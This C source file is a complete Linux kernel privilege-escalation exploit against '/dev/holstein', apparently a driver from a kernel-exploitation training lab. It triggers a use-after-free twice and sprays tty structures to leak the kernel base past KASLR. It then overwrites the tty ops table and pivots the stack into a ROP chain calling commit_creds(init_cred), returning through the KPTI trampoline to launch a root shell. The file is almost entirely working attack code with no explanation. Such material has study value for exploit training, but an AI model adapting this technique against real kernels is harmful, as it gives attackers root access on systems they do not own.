#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define SUCCESS(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define ofs_tty_ops 0xc39c60
#define rop_pop_rdi (kbase + 0x14078a)
#define rop_mov_esp_0x39000000 (kbase + 0x52044e)
#define addr_init_cred (kbase + 0xE37A60)
#define addr_commit_creds (kbase + 0x723C0)
#define kpti_trampoline (kbase + 0x800E26)

// for saved states
uint64_t iter, user_cs, user_ss, user_rflags, user_rsp;
uint64_t kbase, g_buf1;
uint32_t fd1, fd1_dup;
uint32_t fd2, fd2_dup;
uint32_t spray[100];
char buf[0x400];

void save_state()
{
    asm volatile(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");

    INFO("Saved state");
}

static void win()
{
    char* argv[] = { "/bin/sh", NULL };
    char* envp[] = { NULL };
    SUCCESS("win!");
    execve("/bin/sh", argv, envp);
}

int main()
{
    save_state();

    fd1 = open("/dev/holstein", O_RDWR);
    fd1_dup = open("/dev/holstein", O_RDWR);
    if (fd1 == -1 || fd1_dup == -1)
        ERROR("/dev/holstein");

    close(fd1_dup);

    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            ERROR("/dev/ptmx");
    }
    
    // KASLRの回避
    read(fd1, buf, 0x400);

    kbase = *(uint64_t *)&buf[0x18] - ofs_tty_ops;
    printf("[+] kbase = 0x%016lx\n", kbase);

    g_buf1 = *(uint64_t *)&buf[0x38] - 0x38;
    printf("[+] g_buf1 = 0x%016lx\n", g_buf1);
    // END KASLRの回避

    uint64_t *p = (uint64_t*)&buf;
    p[12] = rop_mov_esp_0x39000000;
    write(fd1, buf, 0x400);

    // rop preparation
    void *map = mmap((void *)0x38ff8000, 0x10000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

    uint64_t *rop = 0x39000000;
    *rop++ = rop_pop_rdi;
    *rop++ = addr_init_cred;
    *rop++ = addr_commit_creds;
    *rop++ = kpti_trampoline;
    *rop++;
    *rop++;
    *rop++ = (uint64_t)&win;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_rsp;
    *rop++ = user_ss;

    // 2回目のUse-after-Free
    fd2 = open("/dev/holstein", O_RDWR);
    fd2_dup = open("/dev/holstein", O_RDWR);
    if (fd2 == -1 || fd2_dup == -1)
        ERROR("/dev/holstein");

    close(fd2_dup);

    for (int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            ERROR("/dev/ptmx");
    }

    read(fd2, buf, 0x20);
    *(uint64_t *)&buf[0x18] = g_buf1; // overwrite ops table with buf1 address
    write(fd2, buf, 0x20);

    for (int i = 50; i < 100; i++) {
        ioctl(spray[i], 0xdeadbeefbeefdead /* rcx */, 0xcafebabebabecafe /* rdx */);
    }

    return 0;
}